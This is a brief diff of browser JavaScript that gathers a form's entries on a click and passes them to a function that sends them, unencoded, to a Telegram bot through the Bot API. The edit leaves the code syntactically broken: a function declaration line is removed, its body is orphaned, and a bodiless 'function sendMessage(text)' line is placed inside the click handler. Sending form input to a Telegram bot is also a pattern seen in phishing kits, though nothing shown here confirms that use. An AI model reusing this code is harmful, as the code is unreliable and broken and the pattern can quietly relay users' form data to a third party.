@@ -6,7 +6,6 @@ let tg = {
 }
 x.addEventListener("click", myFunction);
 
-function sendMessage(text)
 {
     const url = `https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.chat_id}&text=${text}`; // The url to request
     const xht = new XMLHttpRequest();
@@ -15,5 +14,10 @@ function sendMessage(text)
 }
 function myFunction() 
 {
-  sendMessage(form);
+    const data = new FormData(form);
+
+  // Do a bit of work to convert the entries to a plain JS object
+const value = Object.fromEntries(data.entries());
+function sendMessage(text)
+  sendMessage(value);
 }
